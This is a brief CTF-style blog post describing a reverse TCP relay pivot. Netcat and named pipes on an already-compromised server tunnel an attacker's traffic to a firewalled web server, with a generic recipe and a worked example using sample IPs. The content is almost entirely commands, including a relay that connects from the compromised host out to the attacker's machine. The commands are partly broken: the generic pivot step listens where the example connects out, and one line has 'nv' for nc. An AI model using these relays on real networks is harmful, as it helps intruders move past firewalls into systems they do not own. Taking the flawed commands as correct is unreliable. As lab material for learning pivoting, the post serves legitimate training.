---
layout: post
title: "Reverse TCP-Relay Pivot"
date: 2024-12-27 12:00:00 -0000
categories: ctf writeups
---

knowns:

* targetip targetport (webserver will be 80 and/or 443)
* pivotip
* attacker2ip

in the attacker2 terminal, set-up a double-listener:

`mkfifo a-pipe`

`nc -nv -l -p port1 < a-pipe | nc -nv -l -p port2 > a-pipe`

in pivot terminal, set-up the relay:

`mkfifo p-pipe`

`nc -nv -l -p port1 < p-pipe | nc -nv targetip targetport > p-pipe`

note the connection established in attacker2 terminal:

`connect to attacker2ip from (unknown) pivotip`

send payload from attacker1 terminal:

`curl http://127.0.0.1:port2`

`<html>

	You should write this password
	down for the CTF: {flag}

</html>`


**example: **

* targetip is a webserver on 55.55.55.55:80
* pivotip is a server, say 44.44.44.44, that you've already compromised but has different firewall settings from the webserver, and communicates with the webserver.
* attacker2ip is 1.1.1.1

attacker has 2 terminals open, one for the payload, and one for the double-listener. starting with the double-listener's terminal, make the namedpipe and set up the double-listener:

`mkfifo attpipe`

`nv -nv -l -p 12345 < attpipe | nc -nv -l -p 8080 > attpipe`

on the pivot server, make the named pipe and then set up the relay:

`mkfifo pivpipe`

`nc -nv 1.1.1.1 12345 < pivpipe | nc -nv 55.55.55.55 80 > pivpipe`

note the connection with the 'connect to' statement, then go to attacker's payload terminal and send the command:

`curl http://127.0.0.1:8080`



`<html>

	You should write this password
	down for the CTF: {flag}

</html>`


